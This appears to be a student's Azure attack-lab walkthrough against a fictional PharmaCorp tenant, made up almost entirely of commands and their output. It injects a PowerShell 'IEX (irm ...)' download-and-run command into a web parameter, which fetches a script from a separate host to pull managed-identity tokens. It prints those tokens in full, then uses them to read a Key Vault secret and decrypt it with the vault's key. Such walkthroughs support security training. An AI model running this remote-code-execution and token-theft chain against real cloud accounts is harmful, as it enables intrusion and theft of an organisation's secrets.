# Attack Lab 19

```
− Extract the Keys and Secrets from the Key Vault (compositionsecrets).
− Leverage the Keys to decrypt the Secrets
```
Upload files (WAF bypass):
```
https://contactpharmacorp.azurewebsites.net/studentuserkeyvaut.txt
$headers = @{'secret' = '03B4C9B76E004F11ADA50DAC8CFE4753'}
Invoke-RestMethod -Method GET -Uri "http://127.0.0.1:41693/MSI/token/?resource=https://vault.azure.net&api-version=2017-09-01" -Headers $headers
```
```
https://contactpharmacorp.azurewebsites.net/studentuser107.txt
$headers = @{'secret' = '03B4C9B76E004F11ADA50DAC8CFE4753'}
Invoke-RestMethod -Method GET -Uri "http://127.0.0.1:41693/MSI/token/?resource=https://management.azure.com&api-version=2017-09-01" -Headers $headers
```
Token Extraction:
```
https://analytics.pharmacorphq.com/main?inputUser=powershell%20-c%20%22IEX%20(irm%20%27https://contactpharmacorp.azurewebsites.net/studentuser107.txt%27)%22&category-color=success#
```
RCE output:
```
access_token : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9m               eG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdl               dyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjo               iaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDU               tMTg0NzAxNTRiN2NkLyIsImlhdCI6MTY5Njg0NjMwOSwibmJmIjoxNjk2ODQ2MzA               5LCJleHAiOjE2OTY5MzMwMDksImFpbyI6IkUyRmdZR0RLa1AxOFh1ZE1xa2ZaeXU               4dGRkY2lBUT09IiwiYXBwaWQiOiIzMzI5ZmVhNy02NDJlLTRjMDktYjFhZC1kOGV               kYmUxNDAyNjciLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5               kb3dzLm5ldC9lMGY5OTljMS04NmVlLTQ3YTAtYmZkNS0xODQ3MDE1NGI3Y2QvIiw               iaWR0eXAiOiJhcHAiLCJvaWQiOiI3ZGY5YWU1Ny0zZWI5LTQzN2MtYTBlMi03MTQ               yODM3ODRjZGQiLCJyaCI6IjAuQUhFQXdabjU0TzZHb0VlXzFSaEhBVlMzelVaSWY               za0F1dGRQdWtQYXdmajJNQk9IQUFBLiIsInN1YiI6IjdkZjlhZTU3LTNlYjktNDM               3Yy1hMGUyLTcxNDI4Mzc4NGNkZCIsInRpZCI6ImUwZjk5OWMxLTg2ZWUtNDdhMC1               iZmQ1LTE4NDcwMTU0YjdjZCIsInV0aSI6Imh2d1oxbTNTaEVDSHNOakE4bmxIQUE               iLCJ2ZXIiOiIxLjAiLCJ4bXNfY2FlIjoiMSIsInhtc19taXJpZCI6Ii9zdWJzY3J               pcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLThkMzNmMjc0MTE2Zi9yZXN               vdXJjZWdyb3Vwcy9BbmFseXRpY3MvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l               0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCIsInhtc190Y2R0IjoxNjU1MzUzNjI4fQ.               l6ZGCU36UcnC2v3KdENdJWPkiYmqrvf7MzZA7GF4Olz-HlWyMJ0SZloiQ8nk9Yyl               -hPRKgL8pR9CQ0nySxe5w0g837JeGk5DUPoYHbYPbHHVPPt3rCNM8sauLU-1eyTk               OUfqffxeFwvEQ9_KPfJ230EUjw6c2qn0yyelYIer6bbz9PHbpUW7oBzwGTsZKivI               Iud3zB68kXtHM140irHL-wHf2w-FMmputxb8vxWFAxV2ybsMo5xt4I-wc6ydvFwM               0HcB0ylkgtzxIDGRd0J5NAPsGaMRcxhR6qqG3bCXc2Z_y5EW8BsTn1eDhy6ihCcx               T-zqy3Zxz-1n4NUmvb_X8Qexpires_on   : 10/10/2023 10:16:48 AM +00:00resource     : https://management.azure.comtoken_type   : Bearerclient_id    : 3329FEA7-642E-4C09-B1AD-D8EDBE140267
for i in `cat token`; do echo $i; done | tr -d "\n" | awk -F ":" '{print $2}' | tr -d "expires_on"
eyJ0XAOJKV1QLCJhbGcOJSUzI1NIIg1dCI6I1LSTNROW5OUjdUm9mG1lWm9YcWJIWkdldyIImtZCI6I1LSTNROW5OUjdUm9mG1lWm9YcWJIWkdldyJ9.yJhdWQOJdHRwczvL21hbmFZW1lbQuYX1cmUuY29tIwaXNzIjaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzANTRN2NkLyIImlhdCI6MTY5Njg0NjMwOSwbmJmIjNjk2ODQ2MzA5LCJlHAOjE2OTY5MzMwMDkImFbyI6IkUyRmdZR0RLa1AOFh1ZE1a2ZaXU4dGRkY2lBUT09IwYXBwaWQOIzMzI5ZmVhNy02NDJlLTRjMDktYjFhZC1kOGVkYmUNDAyNjcLCJhcHBZGFjcI6IjILCJZHAOJdHRwczvL3N0cy53aW5kb3dzLm5ldC9lMGY5OTljMS04NmVlLTQ3YTAtYmZkNS0ODQ3MDE1NGI3Y2QvIwaWR0XAOJhcHALCJvaWQOI3ZGY5YWU1Ny0zZWI5LTQzN2MtYTBlM03MTQyODM3ODRjZGQLCJyaCI6IjAuQUhFQXdabjU0TzZHb0VlXzFSaEhBVlMzlVaSWYza0F1dGRQdWtQYXdmajJNQk9IQUFBLIIN1YI6IjdkZjlhZTU3LTNlYjktNDM3Yy1hMGUyLTcNDI4Mzc4NGNkZCIIRZCI6ImUwZjk5OWMLTg2ZWUtNDdhMC1ZmQ1LTE4NDcwMTU0YjdjZCIIV0aSI6Imh2d1bTNTaEVDSHNOakE4bmIQUELCJ2ZXIOILjALCJ4bXNfY2FlIjMSIIhtc19taXJZCI6I9zdWJzY3JcHRb25zL2FhYzAyZjc0LWIwZDItNDVkM04ZmJjLThkMzNmMjc0MTE2Z9yZXNvdXJjZWdyb3Vwcy9BbmFXRY3MvcHJvdmlkZXJzL01Y3Jvc29mdC5XZWIvc2l0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCIIhtc190Y2R0IjNjU1MzUzNjI4fQ.l6ZGCU36UcC2v3KdENdJWPkYmqvf7MzZA7GF4Olz-HlWyMJ0SZlQ8k9Yyl-hPRKgL8R9CQ0yS5w0g837JGk5DUPYHbYPbHHVPPt3CNM8auLU-1yTkOUfqffFwvEQ9KPfJ230EUjw6c2q0yylYI6bbz9PHbUW7BzwGTZKvIIud3zB68kXtHM140HL-wHf2w-FMmutb8vWFAV2ybM5t4I-wc6ydvFwM0HcB0ylkgtzIDGRd0J5NAPGaMRchR6qqG3bCXc2Zy5EW8BT1Dhy6hCcT-zqy3Zz-14NUmvbX8Q
```
 
Token keyvault:
```
https://analytics.pharmacorphq.com/main?inputUser=powershell%20-c%20%22IEX%20(irm%20%27https://contactpharmacorp.azurewebsites.net/studentuserkeyvaut.txt%27)%22&category-color=success#
```
RCE output:
```
access_token : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9m               eG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdl               dyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHB               zOi8vc3RzLndpbmRvd3MubmV0L2UwZjk5OWMxLTg2ZWUtNDdhMC1iZmQ1LTE4NDc               wMTU0YjdjZC8iLCJpYXQiOjE2OTY4NDY1ODgsIm5iZiI6MTY5Njg0NjU4OCwiZXh               wIjoxNjk2OTMzMjg4LCJhaW8iOiJFMkZnWUxpOWQ4NnNTei9rRHgzOVhGTmo5TTl               ISFFBPSIsImFwcGlkIjoiMzMyOWZlYTctNjQyZS00YzA5LWIxYWQtZDhlZGJlMTQ               wMjY3IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5               uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzAxNTRiN2NkLyIsIm9pZCI               6IjdkZjlhZTU3LTNlYjktNDM3Yy1hMGUyLTcxNDI4Mzc4NGNkZCIsInJoIjoiMC5               BWEVBd1puNTRPNkdvRWVfMVJoSEFWUzN6VG16cU0taWdocEhvOGtQd0w1NlFKT0h               BQUEuIiwic3ViIjoiN2RmOWFlNTctM2ViOS00MzdjLWEwZTItNzE0MjgzNzg0Y2R               kIiwidGlkIjoiZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzAxNTRiN2NkIiw               idXRpIjoibUgzU2pWTUhoVXFpRjBIRS1JbERBQSIsInZlciI6IjEuMCIsInhtc19               taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLTh               kMzNmMjc0MTE2Zi9yZXNvdXJjZWdyb3Vwcy9BbmFseXRpY3MvcHJvdmlkZXJzL01               pY3Jvc29mdC5XZWIvc2l0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCJ9.DJ2ZC-7wEK               uY1OeN99skYkUgo2pC3M4c4dZHGHOdgAlylnytQGlUwuySWQAa1vZ-RH2raMCbcb               HEZJ49xuh-Qk-N2im-anZqcN6lQd20CLObH0IHjdF0V6nXF32tigww0qeBj7K32L               aLL9ac5qcS0P-fYO1LGx-FRnVQ0gB5fGg29tGvzH-OFf8hdpbvQc_3DiCZNhPebW               l06FOJToy74OUCI-3BMNTpwZuR3XicsFXHeIxFmVcKyj224gikdATUadD9o-PTZu               DYfVtJgAT2OvWeg7tpR-bAeSJVhGfEnvNwvK8pJmCiuqGqlRRdOYrUfeg6NvtKRm               lYKmDw75RRIwexpires_on   : 10/10/2023 10:21:27 AM +00:00resource     : https://vault.azure.nettoken_type   : Bearerclient_id    : 3329FEA7-642E-4C09-B1AD-D8EDBE140267
for i in `cat token_vault`; do echo $i; done | tr -d "\n" | awk -F ":" '{print $2}' | tr -d "expires_on"
eyJ0XAOJKV1QLCJhbGcOJSUzI1NIIg1dCI6I1LSTNROW5OUjdUm9mG1lWm9YcWJIWkdldyIImtZCI6I1LSTNROW5OUjdUm9mG1lWm9YcWJIWkdldyJ9.yJhdWQOJdHRwczvL3ZhdW0LmF6dXJlLm5ldCIImlzcyI6Imh0dHBzO8vc3RzLdbmRvd3MubmV0L2UwZjk5OWMLTg2ZWUtNDdhMC1ZmQ1LTE4NDcwMTU0YjdjZC8LCJYXQOjE2OTY4NDY1ODgIm5ZI6MTY5Njg0NjU4OCwZXhwIjNjk2OTMzMjg4LCJhaW8OJFMkZWUOWQ4NNT9RHgzOVhGTm5TTlISFFBPSIImFwcGlkIjMzMyOWZlYTctNjQyZS00YzA5LWIYWQtZDhlZGJlMTQwMjY3IwYXBwaWRhY3IOIyIwaWRwIjaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzANTRN2NkLyIIm9ZCI6IjdkZjlhZTU3LTNlYjktNDM3Yy1hMGUyLTcNDI4Mzc4NGNkZCIIJIjMC5BWEVBd1uNTRPNkdvRWVfMVJSEFWUzN6VG16cU0taWdcEhvOGtQd0w1NlFKT0hBQUEuIwc3VIjN2RmOWFlNTctM2VOS00MzdjLWEwZTItNzE0MjgzNzg0Y2RkIwdGlkIjZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzANTRN2NkIwdXRIjbUgzU2WTUhVXFRjBIRS1JbERBQSIIZlcI6IjEuMCIIhtc19taXJZCI6I9zdWJzY3JcHRb25zL2FhYzAyZjc0LWIwZDItNDVkM04ZmJjLThkMzNmMjc0MTE2Z9yZXNvdXJjZWdyb3Vwcy9BbmFXRY3MvcHJvdmlkZXJzL01Y3Jvc29mdC5XZWIvc2l0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCJ9.DJ2ZC-7wEKuY1ON99kYkUg2C3M4c4dZHGHOdgAlylytQGlUwuySWQAa1vZ-RH2aMCbcbHEZJ49uh-Qk-N2m-aZqcN6lQd20CLObH0IHjdF0V6XF32tgww0qBj7K32LaLL9ac5qcS0P-fYO1LG-FRVQ0gB5fGg29tGvzH-OFf8hdbvQc3DCZNhPbWl06FOJTy74OUCI-3BMNTwZuR3XcFXHIFmVcKyj224gkdATUadD9-PTZuDYfVtJgAT2OvWg7tR-bASJVhGfEvNwvK8JmCuqGqlRRdOYUfg6NvtKRmlYKmDw75RRIw
```

Abusse permissions:

```
PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> $auth= "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzAxNTRiN2NkLyIsImlhdCI6MTY5Njg0NjMwOSwibmJmIjoxNjk2ODQ2MzA5LCJleHAiOjE2OTY5MzMwMDksImFpbyI6IkUyRmdZR0RLa1AxOFh1ZE1xa2ZaeXU4dGRkY2lBUT09IiwiYXBwaWQiOiIzMzI5ZmVhNy02NDJlLTRjMDktYjFhZC1kOGVkYmUxNDAyNjciLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9lMGY5OTljMS04NmVlLTQ3YTAtYmZkNS0xODQ3MDE1NGI3Y2QvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI3ZGY5YWU1Ny0zZWI5LTQzN2MtYTBlMi03MTQyODM3ODRjZGQiLCJyaCI6IjAuQUhFQXdabjU0TzZHb0VlXzFSaEhBVlMzelVaSWYza0F1dGRQdWtQYXdmajJNQk9IQUFBLiIsInN1YiI6IjdkZjlhZTU3LTNlYjktNDM3Yy1hMGUyLTcxNDI4Mzc4NGNkZCIsInRpZCI6ImUwZjk5OWMxLTg2ZWUtNDdhMC1iZmQ1LTE4NDcwMTU0YjdjZCIsInV0aSI6Imh2d1oxbTNTaEVDSHNOakE4bmxIQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfY2FlIjoiMSIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLThkMzNmMjc0MTE2Zi9yZXNvdXJjZWdyb3Vwcy9BbmFseXRpY3MvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCIsInhtc190Y2R0IjoxNjU1MzUzNjI4fQ.l6ZGCU36UcnC2v3KdENdJWPkiYmqrvf7MzZA7GF4Olz-HlWyMJ0SZloiQ8nk9Yyl-hPRKgL8pR9CQ0nySxe5w0g837JeGk5DUPoYHbYPbHHVPPt3rCNM8sauLU-1eyTkOUfqffxeFwvEQ9_KPfJ230EUjw6c2qn0yyelYIer6bbz9PHbpUW7oBzwGTsZKivIIud3zB68kXtHM140irHL-wHf2w-FMmputxb8vxWFAxV2ybsMo5xt4I-wc6ydvFwM0HcB0ylkgtzxIDGRd0J5NAPsGaMRcxhR6qqG3bCXc2Z_y5EW8BsTn1eDhy6ihCcxT-zqy3Zxz-1n4NUmvb_X8Q"
PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> $vault= "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0L2UwZjk5OWMxLTg2ZWUtNDdhMC1iZmQ1LTE4NDcwMTU0YjdjZC8iLCJpYXQiOjE2OTY4NDY1ODgsIm5iZiI6MTY5Njg0NjU4OCwiZXhwIjoxNjk2OTMzMjg4LCJhaW8iOiJFMkZnWUxpOWQ4NnNTei9rRHgzOVhGTmo5TTlISFFBPSIsImFwcGlkIjoiMzMyOWZlYTctNjQyZS00YzA5LWIxYWQtZDhlZGJlMTQwMjY3IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzAxNTRiN2NkLyIsIm9pZCI6IjdkZjlhZTU3LTNlYjktNDM3Yy1hMGUyLTcxNDI4Mzc4NGNkZCIsInJoIjoiMC5BWEVBd1puNTRPNkdvRWVfMVJoSEFWUzN6VG16cU0taWdocEhvOGtQd0w1NlFKT0hBQUEuIiwic3ViIjoiN2RmOWFlNTctM2ViOS00MzdjLWEwZTItNzE0MjgzNzg0Y2RkIiwidGlkIjoiZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzAxNTRiN2NkIiwidXRpIjoibUgzU2pWTUhoVXFpRjBIRS1JbERBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLThkMzNmMjc0MTE2Zi9yZXNvdXJjZWdyb3Vwcy9BbmFseXRpY3MvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCJ9.DJ2ZC-7wEKuY1OeN99skYkUgo2pC3M4c4dZHGHOdgAlylnytQGlUwuySWQAa1vZ-RH2raMCbcbHEZJ49xuh-Qk-N2im-anZqcN6lQd20CLObH0IHjdF0V6nXF32tigww0qeBj7K32LaLL9ac5qcS0P-fYO1LGx-FRnVQ0gB5fGg29tGvzH-OFf8hdpbvQc_3DiCZNhPebWl06FOJToy74OUCI-3BMNTpwZuR3XicsFXHeIxFmVcKyj224gikdATUadD9o-PTZuDYfVtJgAT2OvWeg7tpR-bAeSJVhGfEnvNwvK8pJmCiuqGqlRRdOYrUfeg6NvtKRmlYKmDw75RRIw"
PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> Connect-AzAccount -AccessToken $auth -KeyVaultAccessToken $vault -AccountId 3329FEA7-642E-4C09-B1AD-D8EDBE140267

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
3329FEA7-642E-4C09-B1AD-D8EDBE140267 PharmaCorp       e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud

$KeyVault= Get-AzKeyVault
WARNING: We have migrated the API calls for this cmdlet from Azure Active Directory Graph to Microsoft Graph.
Visit https://go.microsoft.com/fwlink/?linkid=2181475 for any permission issues.
$keyVault.VaultName
compositionsecrets
$KeyVaultSecretName = Get-AzKeyVaultSecret -VaultName $KeyVault.VaultName
$KeyvaultSecretName.Name
compositionprocessing-masterkey
$Encryptedvalue = Get-AzKeyVaultSecret -VaultName $KeyVault.VaultName -Name $KeyVaultSecretName.Name -AsPlainText
$EncryptedValue = Get-AzKeyVaultSecret -VaultName $KeyVault.VaultName -Name $KeyVaultSecretName.Name -AsPlainText
$EncryptedValue
MtK4CFkZF0Hx11MKfD3nz0FHfKMRJzIeuKY/T+O9Y/VXOkTc8LtpzqNgBD8ObB0ZEqpJgwAXBk1xHbK/JbT4lWEHikNKq5o3g86SyiSKEyYYh//cVU6yc1SkprKCPuNYWXQqosvq1Y4r3zfRsL5C4dKWaatBNDj2LhuH5bFxOlYhAlCmMWSRXm44mJYBrbFlplvIsAX/c40tRXL6HpgTxA++FWyoXfwUtDqhHcNL/cH0BbX/bQAaxSoQT1frw2P1DZvVfqFEdKBIJKMBP4npMWLL1WB9XwzMT4CEUAoUHSxxk02ShKdor5cigUPK52jqEzEPTNmZduR8s2/9dBRM7g==
```
Extract key:
```
PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> $keyVaultKey = Get-AzKeyVaultKey -VaultName $keyvault.VaultName
PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> $keyVaultKey


Vault/HSM Name : compositionsecrets
Name           : EncryptionKey
Version        :
Id             : https://compositionsecrets.vault.azure.net:443/keys/EncryptionKey
Enabled        : True
Expires        :
Not Before     :
Created        : 6/30/2022 2:43:34 PM
Updated        : 6/30/2022 2:43:34 PM
Recovery Level : Recoverable+Purgeable
Tags           :

```
Decrypt secrets:

```
Invoke-AzKeyVaultKeyOperation -Operation Decrypt -Algorithm RSA1_5 -VaultName $KeyVault.VaultName -Name $KeyVaultKey.Name -Value (ConvertTo-SecureString -String $EncryptedValue -AsPlainText -Force) | FL


KeyId     : https://compositionsecrets.vault.azure.net/keys/EncryptionKey/e117ee35db434bc799fff01f5f36fea3
Result    : 7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w==
Algorithm : RSA1_5

```
